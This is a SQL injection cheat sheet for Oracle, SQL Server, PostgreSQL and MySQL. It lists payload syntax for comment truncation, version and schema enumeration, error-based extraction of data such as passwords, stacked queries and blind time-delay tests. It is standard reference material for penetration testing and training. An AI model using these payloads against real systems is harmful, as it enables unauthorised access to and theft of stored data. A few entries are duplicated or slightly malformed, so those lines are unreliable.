# SQL injection cheat sheet

## String concatenation

- You can concatenate together multiple strings to make a single string.

|            |                                                                                   |
| ---------- | --------------------------------------------------------------------------------- |
| Oracle     | `'foo'\|\|'bar'`                                                                  |
| Microsoft  | `'foo'+'bar'`                                                                     |
| PostgreSQL | `'foo'\|\|'bar'`                                                                  |
| MySQL      | `'foo' 'bar'` [Note the space between the two strings]  <br>`CONCAT('foo','bar')` |

## Substring

- You can extract part of a string, from a specified offset with a specified length. Note that the offset index is 1-based. Each of the following expressions will return the string `ba`.

|   |   |
|---|---|
|Oracle|`SUBSTR('foobar', 4, 2)`|
|Microsoft|`SUBSTRING('foobar', 4, 2)`|
|PostgreSQL|`SUBSTRING('foobar', 4, 2)`|
|MySQL|`SUBSTRING('foobar', 4, 2)`|

## Comments

- You can use comments to truncate a query and remove the portion of the original query that follows your input.

|            |                                                                                        |
| ---------- | -------------------------------------------------------------------------------------- |
| Oracle     | `--comment   `                                                                         |
| Microsoft  | `--comment   ` <br>`/*comment*/`                                                       |
| PostgreSQL | `--comment` <br>`/*comment*/`                                                          |
| MySQL      | `#comment`  <br>`-- comment` [Note the space after the double dash]  <br>`/*comment*/` |

## Database version

You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.

|            |                                                                       |
| ---------- | --------------------------------------------------------------------- |
| Oracle     | `SELECT banner FROM v$version `  <br>`SELECT version FROM v$instance` |
| Microsoft  | `SELECT @@version`                                                    |
| PostgreSQL | `SELECT version()`                                                    |
| MySQL      | `SELECT @@version`                                                    |
## Database contents

- You can list the tables that exist in the database, and the columns that those tables contain.

|            |                                                                                                                                                     |
| ---------- | --------------------------------------------------------------------------------------------------------------------------------------------------- |
| Oracle     | `SELECT table_name FROM all_tables`<br> `SELECT column_name FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'`                              |
| Microsoft  | `SELECT table_name FROM information_schema.tables ` <br>  `SELECT column_name FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
| PostgreSQL | `SELECT table_name FROM information_schema.tables `<br> `SELECT column_name FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'`   |
| MySQL      | `SELECT table_name FROM information_schema.tables`<br> `SELECT column_name FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'`    |

## Conditional errors

- You can test a single boolean condition and trigger a database error if the condition is true.

|   |   |
|---|---|
|Oracle|`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual`|
|Microsoft|`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END`|
|PostgreSQL|`1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)`|
|MySQL|`SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')`|
## Extracting data via visible error messages

- You can potentially elicit error messages that leak sensitive data returned by your malicious query.

|   |   |
|---|---|
|Microsoft|`SELECT 'foo' WHERE 1 = (SELECT 'secret') > Conversion failed when converting the varchar value 'secret' to data type int.`|
|PostgreSQL|`SELECT CAST((SELECT password FROM users LIMIT 1) AS int) > invalid input syntax for integer: "secret"`|
|MySQL|`SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret'))) > XPATH syntax error: '\secret'`|

## Extracting data via visible error messages

You can potentially elicit error messages that leak sensitive data returned by your malicious query.

|            |                                                                                                                             |
| ---------- | --------------------------------------------------------------------------------------------------------------------------- |
| Microsoft  | `SELECT 'foo' WHERE 1 = (SELECT 'secret') > Conversion failed when converting the varchar value 'secret' to data type int.` |
| PostgreSQL | `SELECT CAST((SELECT password FROM users LIMIT 1) AS int) > invalid input syntax for integer: "secret"`                     |
| MySQL      | `SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret'))) > XPATH syntax error: '\secret'`               |
## Batched (or stacked) queries

- You can use batched queries to execute multiple queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. Hence this technique is primarily of use in relation to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error, or time delay.

|            |                                                              |
| ---------- | ------------------------------------------------------------ |
| Oracle     | `Does not support batched queries.`                          |
| Microsoft  | `QUERY-1-HERE; QUERY-2-HERE` <br> QUERY-1-HERE QUERY-2-HERE` |
| PostgreSQL | `QUERY-1-HERE; QUERY-2-HERE`                                 |
| MySQL      | `QUERY-1-HERE; QUERY-2-HERE`                                 |
## Time delays

- You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.

|   |   |
|---|---|
|Oracle|`dbms_pipe.receive_message(('a'),10)`|
|Microsoft|`WAITFOR DELAY '0:0:10'`|
|PostgreSQL|`SELECT pg_sleep(10)`|
|MySQL|`SELECT SLEEP(10)`|

## Conditional time delays

- You can test a single boolean condition and trigger a time delay if the condition is true.

|   |   |
|---|---|
|Oracle|`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'\|dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual`|
|Microsoft|`IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'`|
|PostgreSQL|`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END`|
|MySQL|`SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')`|
## References
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
- https://portswigger.net/web-security/sql-injection/cheat-sheet
- https://book.hacktricks.xyz/pentesting-web/sql-injection
- https://github.com/danielmiessler/SecLists
- https://book.hacktricks.xyz/pentesting-web/sql-injection